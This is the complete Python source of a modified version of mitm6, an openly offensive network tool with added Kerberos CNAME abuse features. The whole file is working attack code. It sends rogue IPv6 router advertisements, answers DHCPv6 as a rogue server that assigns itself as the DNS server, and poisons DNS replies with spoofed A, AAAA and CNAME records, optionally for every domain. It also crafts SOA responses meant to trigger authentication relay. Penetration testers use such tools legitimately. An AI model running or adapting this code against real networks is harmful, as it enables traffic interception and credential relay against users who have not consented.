from __future__ import unicode_literals
from scapy.all import sniff, ls, ARP, IPv6, DNS, DNSRR, Ether, conf, IP, UDP, DNSRRSOA
from twisted.internet import reactor
from twisted.internet.protocol import ProcessProtocol, DatagramProtocol
from scapy.layers.dhcp6 import *
from scapy.layers.inet6 import ICMPv6ND_RA
from scapy.sendrecv import sendp
from twisted.internet import task, threads
from builtins import str
import os
import json
import random
import ipaddress
import netifaces
import sys
import argparse
import socket
import builtins
import time
import subprocess
import threading

# Globals
pcdict = {}
arptable = {}
arp_dns_lock = threading.Lock()  # Lock for ARP DNS operations
try:
    with open('arp.cache', 'r') as arpcache:
        arptable = json.load(arpcache)
except IOError:
    pass

# Config class - contains runtime config
class Config(object):
    def __init__(self, args):
        # IP autodiscovery / config override
        if args.interface is None:
            self.dgw = netifaces.gateways()['default']
            self.default_if = self.dgw[netifaces.AF_INET][1]
        else:
            self.default_if = args.interface
        if args.ipv4 is None:
            self.v4addr = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET][0]['addr']
        else:
            self.v4addr = args.ipv4
        if args.ipv6 is None:
            try:
                self.v6addr = None
                addrs = netifaces.ifaddresses(self.default_if)[netifaces.AF_INET6]
                for addr in addrs:
                    if 'fe80::' in addr['addr']:
                        self.v6addr = addr['addr']
            except KeyError:
                self.v6addr = None
            if not self.v6addr:
                print('Error: The interface {0} does not have an IPv6 link-local address assigned. Make sure IPv6 is activated on this interface.'.format(self.default_if))
                sys.exit(1)
        else:
            self.v6addr = args.ipv6
        if args.mac is None:
            self.macaddr = netifaces.ifaddresses(self.default_if)[netifaces.AF_LINK][0]['addr']
        else:
            self.macaddr = args.mac

        if '%' in self.v6addr:
            self.v6addr = self.v6addr[:self.v6addr.index('%')]
        # End IP autodiscovery

        # This is partly static, partly filled in from the autodiscovery above
        self.ipv6prefix = 'fe80::' #link-local
        self.selfaddr = self.v6addr
        self.selfmac = self.macaddr
        self.ipv6cidr = '64'
        self.selfipv4 = self.v4addr
        self.selfduid = DUID_LL(lladdr = self.macaddr)
        self.selfptr = ipaddress.ip_address(str(self.selfaddr)).reverse_pointer + '.'
        self.ipv6noaddr = random.randint(1,9999)
        self.ipv6noaddrc = 1
        # Relay target
        if args.relay:
            self.relay = args.relay.lower()
        else:
            self.relay = None
        # CNAME target for DNS poisoning
        if args.cname_source_all:
            self.cname_source_all = True
            self.cname_source = None
        elif args.cname_source:
            self.cname_source_all = False
            self.cname_source = args.cname_source.lower()
            # Ensure cname_source has trailing dot for proper DNS formatting
            if not self.cname_source.endswith('.'):
                self.cname_source += '.'
        else:
            self.cname_source_all = False
            self.cname_source = None
            
        if args.cname:
            self.cname_target = args.cname.lower()
            # Ensure CNAME target has trailing dot for proper DNS formatting
            if not self.cname_target.endswith('.'):
                self.cname_target += '.'
        else:
            self.cname_target = None
            
        # CNAME with A record option - enabled by default when CNAME is configured
        self.cname_with_a = bool((self.cname_source or self.cname_source_all) and self.cname_target)
        
        # DNS allowlist / blocklist options
        self.dns_allowlist = [d.lower() for d in args.domain]
        self.dns_blocklist = [d.lower() for d in args.blocklist]
        # Hostname (DHCPv6 FQDN) allowlist / blocklist options
        self.host_allowlist = [d.lower() for d in args.host_allowlist]
        self.host_blocklist = [d.lower() for d in args.host_blocklist]
        # Should DHCPv6 queries that do not specify a FQDN be ignored?
        self.ignore_nofqdn = args.ignore_nofqdn
        # Local domain to advertise
        # If no localdomain is specified, use the first dnsdomain
        if args.localdomain is None:
            try:
                self.localdomain = args.domain[0]
            except IndexError:
                self.localdomain = None
        else:
            self.localdomain = args.localdomain.lower()

        self.debug = args.debug
        self.verbose = args.verbose
        self.only_dns = args.only_dns
        
        # ARP DNS settings
        self.arp_dns_ip = args.arp_dns
        self.arp_cooldown = args.arp_cooldown
        self.arp_last_used = 0  # Timestamp of last ARP DNS usage
        
        # Passthrough file handling (after debug is set)
        self.passthrough_file = args.passthrough
        self.passthrough_entries = {}
        if self.passthrough_file:
            try:
                with open(self.passthrough_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line and not line.startswith('#'):
                            domain, ip = line.split(':', 1)
                            domain = domain.strip().lower()
                            ip = ip.strip()
                            # Ensure domain has trailing dot for proper DNS formatting
                            if not domain.endswith('.'):
                                domain += '.'
                            self.passthrough_entries[domain] = ip
                if self.debug:
                    print('Loaded %d passthrough entries from %s' % (len(self.passthrough_entries), self.passthrough_file))
            except IOError as e:
                print('Error reading passthrough file %s: %s' % (self.passthrough_file, e))
                sys.exit(1)
        
        # End of config

# Target class - defines the host we are targetting
class Target(object):
    def __init__(self, mac, host, ipv4=None):
        self.mac = mac
        # Make sure the host is in unicode
        try:
            self.host = host.decode("utf-8")
        except builtins.AttributeError:
            # Already in unicode
            self.host = host
        if ipv4 is not None:
            self.ipv4 = ipv4
        else:
            #Set the IP from the arptable if it is there
            try:
                self.ipv4 = arptable[mac]
            except KeyError:
                self.ipv4 = ''

    def __str__(self):
        return 'mac=%s host=%s ipv4=%s' % (self.mac, str(self.host), self.ipv4)

    def __repr__(self):
        return '<Target %s>' % self.__str__()

def get_fqdn(dhcp6packet):
    try:
        fqdn = dhcp6packet[DHCP6OptClientFQDN].fqdn
        if fqdn[-1] == '.':
            return fqdn[:-1]
        else:
            return fqdn
    #if not specified
    except KeyError:
        return ''

def send_dhcp_advertise(p, basep, target):
    global ipv6noaddrc
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Advertise(trid=p.trid)
    #resp /= DHCP6OptPref(prefval = 255)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    if target.ipv4 != '':
        addr = config.ipv6prefix + target.ipv4.replace('.', ':')
    else:
        addr = config.ipv6prefix + '%d:%d' % (config.ipv6noaddr, config.ipv6noaddrc)
        config.ipv6noaddrc += 1
    opt = DHCP6OptIAAddress(preflft=300, validlft=300, addr=addr)
    resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
    sendp(resp, iface=config.default_if, verbose=False)

def send_dhcp_reply(p, basep):
    resp = Ether(dst=basep.src)/IPv6(src=config.selfaddr, dst=basep[IPv6].src)/UDP(sport=547, dport=546) #base packet
    resp /= DHCP6_Reply(trid=p.trid)
    #resp /= DHCP6OptPref(prefval = 255)
    resp /= DHCP6OptClientId(duid=p[DHCP6OptClientId].duid)
    resp /= DHCP6OptServerId(duid=config.selfduid)
    resp /= DHCP6OptDNSServers(dnsservers=[config.selfaddr])
    if config.localdomain:
        resp /= DHCP6OptDNSDomains(dnsdomains=[config.localdomain])
    try:
        opt = p[DHCP6OptIAAddress]
        resp /= DHCP6OptIA_NA(ianaopts=[opt], T1=200, T2=250, iaid=p[DHCP6OptIA_NA].iaid)
        sendp(resp, iface=config.default_if, verbose=False)
    except IndexError:
        # Some hosts don't send back this layer for some reason, ignore those
        if config.debug or config.verbose:
            print('Ignoring DHCPv6 packet from %s: Missing DHCP6OptIAAddress layer' % basep.src)

def send_dns_reply(p):
    if IPv6 in p:
        ip = p[IPv6]
        resp = Ether(dst=p.src, src=p.dst)/IPv6(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    else:
        ip = p[IP]
        resp = Ether(dst=p.src, src=p.dst)/IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)
    dns = p[DNS]
    # only reply to IN, and to messages that dont contain answers
    if dns.qd.qclass != 1 or dns.qr != 0:
        return
    # Make sure the requested name is in unicode here
    reqname = dns.qd.qname.decode()
    
    # Initialize variables
    rdata = None
    record_type = dns.qd.qtype
    
    if config.debug:
        print('DNS Query: %s (type: %d)' % (reqname, dns.qd.qtype))
        if config.cname_source_all:
            print('CNAME source-all mode: poisoning ALL domains')
        elif config.cname_source:
            print('CNAME source configured: %s' % config.cname_source)
            print('Query matches CNAME source: %s' % (reqname == config.cname_source))
    
    # Check passthrough file first (highest priority)
    passthrough_ip = None
    if config.passthrough_entries:
        # Try exact match first
        if reqname in config.passthrough_entries:
            passthrough_ip = config.passthrough_entries[reqname]
        else:
            # Try to find a match by removing the search domain suffix
            # e.g., dc01.mycorp.local.mycorp.local. -> dc01.mycorp.local.
            for passthrough_domain in config.passthrough_entries:
                if reqname.endswith(passthrough_domain):
                    passthrough_ip = config.passthrough_entries[passthrough_domain]
                    if config.debug:
                        print('Matched passthrough domain %s for query %s' % (passthrough_domain, reqname))
                    break
    
    if passthrough_ip:
        if config.debug:
            print('Using passthrough IP for %s: %s' % (reqname, passthrough_ip))
        # For A queries, use the passthrough IP
        if dns.qd.qtype == 1:
            rdata = passthrough_ip
            record_type = dns.qd.qtype
        # For AAAA queries, we don't have IPv6 in passthrough, so fall through to normal logic
        elif dns.qd.qtype == 28:
            rdata = config.selfaddr
            record_type = dns.qd.qtype
    # Normal CNAME/A record logic
    elif dns.qd.qtype == 1:  # A query
        if config.cname_source_all and config.cname_target:
            # Return CNAME record for ALL domains when cname_source_all is enabled
            rdata = config.cname_target
            record_type = 5  # CNAME record type
        elif config.cname_source and config.cname_target and reqname == config.cname_source:
            # Return CNAME record only for the specific source domain
            rdata = config.cname_target
            record_type = 5  # CNAME record type
        else:
            rdata = config.selfipv4
            record_type = dns.qd.qtype
    elif dns.qd.qtype == 28:  # AAAA query
        if config.cname_source_all and config.cname_target:
            # Return CNAME record for ALL domains when cname_source_all is enabled
            rdata = config.cname_target
            record_type = 5  # CNAME record type
        elif config.cname_source and config.cname_target and reqname == config.cname_source:
            # Return CNAME record only for the specific source domain
            rdata = config.cname_target
            record_type = 5  # CNAME record type
        else:
            rdata = config.selfaddr
            record_type = dns.qd.qtype
    # PTR query
    elif dns.qd.qtype == 12:
        # To reply for PTR requests for our own hostname
        # comment the return statement
        return
        if reqname == config.selfptr:
            #We reply with attacker.domain
            rdata = 'attacker.%s' % config.localdomain
        else:
            return
    # SOA query
    elif dns.qd.qtype == 6 and config.relay:
        if dns.opcode == 5:
            if config.verbose or config.debug:
                print('Dynamic update found, refusing it to trigger auth')
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ns=dns.ns, opcode=5, rcode=5)
            sendp(resp, verbose=False)
        else:
            rdata = config.selfaddr
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, nscount=1, arcount=1, ancount=1, an=DNSRRSOA(rrname=dns.qd.qname, ttl=100, mname="%s." % config.relay, rname="mitm6", serial=1337, type=dns.qd.qtype),
                        ns=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.relay, type=2),
                        ar=DNSRR(rrname=config.relay, type=1, rclass=1, ttl=300, rdata=config.selfipv4))
            sendp(resp, verbose=False)
            if config.verbose or config.debug:
                print('Sent SOA reply')
        return
    #Not handled
    else:
        return
    
    # Only proceed if we have valid rdata for A/AAAA queries
    if rdata is None:
        return
        
    if should_spoof_dns(reqname):
        if ((config.cname_source and config.cname_target and record_type == 5) or 
            (config.cname_source_all and config.cname_target and record_type == 5)):
            if config.cname_with_a:
                # Create CNAME record with A record for the target
                resp /= DNS(id=dns.id, qr=1, qd=dns.qd, ancount=2, 
                           an=[DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.cname_target, type=5),
                               DNSRR(rrname=config.cname_target, ttl=100, rdata=config.selfipv4, type=1)])
                if config.debug:
                    print('Sending CNAME record with A record: %s -> %s (IP: %s)' % (reqname, config.cname_target, config.selfipv4))
            else:
                # Create CNAME record only (no A record for the target)
                resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=config.cname_target, type=5))
                if config.debug:
                    print('Sending CNAME record only: %s -> %s' % (reqname, config.cname_target))
        else:
            # Create A/AAAA record
            resp /= DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=dns.qd.qname, ttl=100, rdata=rdata, type=record_type))
            if config.debug:
                print('Sending %s record: %s -> %s' % ('AAAA' if record_type == 28 else 'A', reqname, rdata))
        try:
            sendp(resp, iface=config.default_if, verbose=False)
        except socket.error as e:
            print('Error sending spoofed DNS')
            print(e)
            if config.debug:
                ls(resp)
        # Check if this was a passthrough response
        passthrough_ip = None
        if config.passthrough_entries:
            if reqname in config.passthrough_entries:
                passthrough_ip = config.passthrough_entries[reqname]
            else:
                for passthrough_domain in config.passthrough_entries:
                    if reqname.endswith(passthrough_domain):
                        passthrough_ip = config.passthrough_entries[passthrough_domain]
                        break
        
        if passthrough_ip:
            print('Sent passthrough reply for %s -> %s to %s' % (reqname, passthrough_ip, ip.src))
        elif ((config.cname_source and config.cname_target and record_type == 5) or 
              (config.cname_source_all and config.cname_target and record_type == 5)):
            if config.cname_with_a:
                print('Sent CNAME spoofed reply for %s -> %s (with A record) to %s' % (reqname, config.cname_target, ip.src))
                # Trigger ARP DNS on successful CNAME with A record spoofing
                if config.debug:
                    print('Triggering ARP DNS for CNAME success')
                trigger_arp_dns()
            else:
                print('Sent CNAME spoofed reply for %s -> %s to %s' % (reqname, config.cname_target, ip.src))
        else:
            print('Sent spoofed reply for %s to %s' % (reqname, ip.src))
    else:
        if config.verbose or config.debug:
            print('Ignored query for %s from %s' % (reqname, ip.src))

# Helper function to check whether any element in the list "matches" value
def matches_list(value, target_list):
    testvalue = value.lower()
    for test in target_list:
        if test in testvalue:
            return True
    return False

# Should we spoof the queried name?
def should_spoof_dns(dnsname):
    # If allowlist exists, host should match
    if config.dns_allowlist and not matches_list(dnsname, config.dns_allowlist):
        return False
    # If there are any entries in the blocklist, make sure it doesnt match against any
    if matches_list(dnsname, config.dns_blocklist):
        return False
    return True

# Should we reply to this host?
def should_spoof_dhcpv6(fqdn):
    # If there is no FQDN specified, check if we should reply to empty ones
    if not fqdn:
        return not config.ignore_nofqdn
    # If allowlist exists, host should match
    if config.host_allowlist and not matches_list(fqdn, config.host_allowlist):
        if config.debug:
            print('Ignoring DHCPv6 packet from %s: FQDN not in allowlist ' % fqdn)
        return False
    # If there are any entries in the blocklist, make sure it doesnt match against any
    if matches_list(fqdn, config.host_blocklist):
        if config.debug:
            print('Ignoring DHCPv6 packet from %s: FQDN matches blocklist ' % fqdn)
        return False
    return True

# Get a target object if it exists, otherwise, create it
def get_target(p):
    mac = p.src
    # If it exists, return it
    try:
        return pcdict[mac]
    except KeyError:
        try:
            fqdn = get_fqdn(p)
        except IndexError:
            fqdn = ''
        pcdict[mac] = Target(mac,fqdn)
        return pcdict[mac]

# Parse a packet
def parsepacket(p):
    if DHCP6_Solicit in p and not config.only_dns:
        target = get_target(p)
        if should_spoof_dhcpv6(target.host):
            send_dhcp_advertise(p[DHCP6_Solicit], p, target)
    if DHCP6_Request in p and not config.only_dns:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
            send_dhcp_reply(p[DHCP6_Request], p)
            print('IPv6 address %s is now assigned to %s' % (p[DHCP6OptIA_NA].ianaopts[0].addr, pcdict[p.src]))
    if DHCP6_Renew in p and not config.only_dns:
        target = get_target(p)
        if p[DHCP6OptServerId].duid == config.selfduid and should_spoof_dhcpv6(target.host):
            send_dhcp_reply(p[DHCP6_Renew],p)
            print('Renew reply sent to %s' % p[DHCP6OptIA_NA].ianaopts[0].addr)
    if ARP in p:
        arpp = p[ARP]
        if arpp.op == 2:
            #Arp is-at package, update internal arp table
            arptable[arpp.hwsrc] = arpp.psrc
    if DNS in p:
        if p.dst == config.selfmac:
            send_dns_reply(p)

def setupFakeDns():
    # We bind to port 53 to prevent ICMP port unreachable packets being sent
    # actual responses are sent by scapy
    sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    fulladdr = config.v6addr+ '%' + config.default_if
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET6, socket.SOCK_DGRAM)
    sock.bind(addrinfo[0][4])
    sock.setblocking(0)
    # Bind IPv4 as well
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    fulladdr = config.v4addr
    addrinfo = socket.getaddrinfo(fulladdr, 53, socket.AF_INET, socket.SOCK_DGRAM)
    sock2.bind(addrinfo[0][4])
    sock2.setblocking(0)
    return sock, sock2

def send_ra():
    # Send a Router Advertisement with the "managed" and "other" flag set, which should cause clients to use DHCPv6 and ask us for addresses
    # routerlifetime is set to 0 in order to not adverise ourself as a gateway (RFC4861, section 4.2)
    p = Ether(src=config.selfmac, dst='33:33:00:00:00:01')/IPv6(src=config.selfaddr, dst='ff02::1')/ICMPv6ND_RA(M=1, O=1, routerlifetime=0)
    sendp(p, iface=config.default_if, verbose=False)

# Whether packet capturing should stop
def should_stop(_):
    return not reactor.running

def shutdownnotice():
    print('')
    print('Shutting down packet capture after next packet...')
    # print(pcdict)
    # print(arptable)
    with open('arp.cache','w') as arpcache:
        arpcache.write(json.dumps(arptable))

def print_err(failure):
    print('An error occurred while sending a packet: %s\nNote that root privileges are required to run mitm6' % failure.getErrorMessage())

# IP address management functions for ARP DNS
def add_ip_address(interface, ip_address):
    try:
        cmd = ['ip', 'addr', 'add', '%s/32' % ip_address, 'dev', interface]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            if config.debug:
                print('Successfully added IP %s to interface %s' % (ip_address, interface))
            return True
        else:
            if config.debug:
                print('Failed to add IP %s to interface %s: %s' % (ip_address, interface, result.stderr))
            return False
    except Exception as e:
        if config.debug:
            print('Error adding IP %s to interface %s: %s' % (ip_address, interface, e))
        return False

def remove_ip_address(interface, ip_address):
    try:
        cmd = ['ip', 'addr', 'del', '%s/32' % ip_address, 'dev', interface]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
        if result.returncode == 0:
            if config.debug:
                print('Successfully removed IP %s from interface %s' % (ip_address, interface))
            return True
        else:
            if config.debug:
                print('Failed to remove IP %s from interface %s: %s' % (ip_address, interface, result.stderr))
            return False
    except Exception as e:
        if config.debug:
            print('Error removing IP %s from interface %s: %s' % (ip_address, interface, e))
        return False

def trigger_arp_dns():
    try:
        if not config.arp_dns_ip:
            if config.debug:
                print('ARP DNS: No IP configured, skipping')
            return
        
        with arp_dns_lock:
            current_time = time.time()
            # Check cooldown
            if current_time - config.arp_last_used < config.arp_cooldown:
                if config.debug:
                    print('ARP DNS on cooldown, skipping (%.1f seconds remaining)' % 
                          (config.arp_cooldown - (current_time - config.arp_last_used)))
                return
            
            # Add IP address
            if add_ip_address(config.default_if, config.arp_dns_ip):
                print('ARP DNS: Added IP %s to interface %s' % (config.arp_dns_ip, config.default_if))
                config.arp_last_used = current_time
                
                # Schedule removal after 5 seconds
                def remove_ip():
                    time.sleep(5)
                    if remove_ip_address(config.default_if, config.arp_dns_ip):
                        print('ARP DNS: Removed IP %s from interface %s' % (config.arp_dns_ip, config.default_if))
                
                # Run removal in background thread
                removal_thread = threading.Thread(target=remove_ip)
                removal_thread.daemon = True
                removal_thread.start()
            else:
                print('ARP DNS: Failed to add IP %s to interface %s' % (config.arp_dns_ip, config.default_if))
    except Exception as e:
        print('ARP DNS: Error in trigger_arp_dns: %s' % e)
        if config.debug:
            import traceback
            traceback.print_exc()

def main():
    global config
    parser = argparse.ArgumentParser(description='mitm6 with Kerberos CNAME Abuse features\nCredit for original mitm6: https://github.com/dirkjanm/mitm6', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("-i", "--interface", type=str, metavar='INTERFACE', help="Interface to use (default: autodetect)")
    parser.add_argument("-l", "--localdomain", type=str, metavar='LOCALDOMAIN', help="Domain name to use as DNS search domain (default: use first DNS domain)")
    parser.add_argument("-4", "--ipv4", type=str, metavar='ADDRESS', help="IPv4 address to send packets from (default: autodetect)")
    parser.add_argument("-6", "--ipv6", type=str, metavar='ADDRESS', help="IPv6 link-local address to send packets from (default: autodetect)")
    parser.add_argument("-m", "--mac", type=str, metavar='ADDRESS', help="Custom mac address - probably breaks stuff (default: mac of selected interface)")
    parser.add_argument("-a", "--no-ra", action='store_true', help="Do not advertise ourselves (useful for networks which detect rogue Router Advertisements)")
    parser.add_argument("--only-dns", action='store_true', help="Only perform DNS poisoning, disable DHCPv6 server functionality and router advertisements")
    parser.add_argument("-r", "--relay", type=str, metavar='TARGET', help="Authentication relay target, will be used as fake DNS server hostname to trigger Kerberos auth")
    parser.add_argument("--cname-source", type=str, metavar='SOURCE_DOMAIN', help="Specific domain to poison with CNAME records (only this domain will get CNAME responses)")
    parser.add_argument("--cname-source-all", action='store_true', help="Poison ALL DNS requests with CNAME records (mutually exclusive with --cname-source)")
    parser.add_argument("--cname", type=str, metavar='CNAME_TARGET', help="CNAME target to poison DNS responses with (used with --cname-source or --cname-source-all, includes A record by default)")
    parser.add_argument("--passthrough", type=str, metavar='FILENAME', help="File containing DNS names and IP addresses (format: domain:ip, one per line)")
    parser.add_argument("--arp-dns", type=str, metavar='IP_ADDRESS', help="IP address to temporarily add to adapter when CNAME spoofing succeeds")
    parser.add_argument("--arp-cooldown", type=int, metavar='SECONDS', default=10, help="Cooldown period between ARP DNS IP additions (default: 10 seconds)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Show verbose information")
    parser.add_argument("--debug", action='store_true', help="Show debug information")

    filtergroup = parser.add_argument_group("Filtering options")
    filtergroup.add_argument("-d", "--domain", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Allowlist principle, multiple can be specified.)")
    filtergroup.add_argument("-b", "--blocklist", "--blacklist", action='append', default=[], metavar='DOMAIN', help="Domain name to filter DNS queries on (Blocklist principle, multiple can be specified.)")
    filtergroup.add_argument("-hw", "-ha", "--host-allowlist", "--host-whitelist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Allowlist principle, multiple can be specified.)")
    filtergroup.add_argument("-hb", "--host-blocklist", "--host-blacklist", action='append', default=[], metavar='DOMAIN', help="Hostname (FQDN) to filter DHCPv6 queries on (Blocklist principle, multiple can be specified.)")
    filtergroup.add_argument("--ignore-nofqdn", action='store_true', help="Ignore DHCPv6 queries that do not contain the Fully Qualified Domain Name (FQDN) option.")

    args = parser.parse_args()
    
    if args.cname_source_all and args.cname_source:
        print('Error: --cname-source-all and --cname-source are mutually exclusive')
        sys.exit(1)
    if (args.cname_source and not args.cname) or (args.cname_source_all and not args.cname) or (args.cname and not args.cname_source and not args.cname_source_all):
        print('Error: --cname must be specified with either --cname-source or --cname-source-all')
        sys.exit(1)
    
    config = Config(args)

    print('Starting mitm6 using the following configuration:')
    print('Primary adapter: %s [%s]' % (config.default_if, config.selfmac))
    print('IPv4 address: %s' % config.selfipv4)
    print('IPv6 address: %s' % config.selfaddr)
    if config.only_dns:
        print('Mode: DNS-only (DHCPv6 server and router advertisements disabled)')
    if config.localdomain is not None:
        print('DNS local search domain: %s' % config.localdomain)
    if config.passthrough_file:
        print('Passthrough file: %s (%d entries)' % (config.passthrough_file, len(config.passthrough_entries)))
    if config.arp_dns_ip:
        print('ARP DNS: Will add IP %s to interface %s on CNAME success (cooldown: %d seconds)' % 
              (config.arp_dns_ip, config.default_if, config.arp_cooldown))
    if config.cname_source_all and config.cname_target is not None:
        print('CNAME poisoning: ALL domains -> %s (with A record)' % config.cname_target)
    elif config.cname_source is not None and config.cname_target is not None:
        print('CNAME poisoning: %s -> %s (with A record)' % (config.cname_source, config.cname_target))
    if not config.dns_allowlist and not config.dns_blocklist:
        print('Warning: Not filtering on any domain, mitm6 will reply to all DNS queries.\nUnless this is what you want, specify at least one domain with -d')
    else:
        if not config.dns_allowlist:
            print('DNS allowlist: *')
        else:
            print('DNS allowlist: %s' % ', '.join(config.dns_allowlist))
            if config.relay and len([matching for matching in config.dns_allowlist if matching in config.relay]) == 0:
                print('Warning: Relay target is specified but the DNS query allowlist does not contain the target name.')
        if config.dns_blocklist:
            print('DNS blocklist: %s' % ', '.join(config.dns_blocklist))
    if config.host_allowlist:
        print('Hostname allowlist: %s' % ', '.join(config.host_allowlist))
    if config.host_blocklist:
        print('Hostname blocklist: %s' % ', '.join(config.host_blocklist))

    #Main packet capture thread
    d = threads.deferToThread(sniff, iface=config.default_if, filter="ip6 proto \\udp or arp or udp port 53", prn=lambda x: reactor.callFromThread(parsepacket, x), stop_filter=should_stop)
    d.addErrback(print_err)

    #RA loop
    if not args.no_ra and not args.only_dns:
        loop = task.LoopingCall(send_ra)
        d = loop.start(30.0)
        d.addErrback(print_err)

    # Set up DNS
    dnssock, dnssock2 = setupFakeDns()
    reactor.adoptDatagramPort(dnssock.fileno(), socket.AF_INET6, DatagramProtocol())
    reactor.adoptDatagramPort(dnssock2.fileno(), socket.AF_INET, DatagramProtocol())

    reactor.addSystemEventTrigger('before', 'shutdown', shutdownnotice)
    reactor.run()

if __name__ == '__main__':
    main()
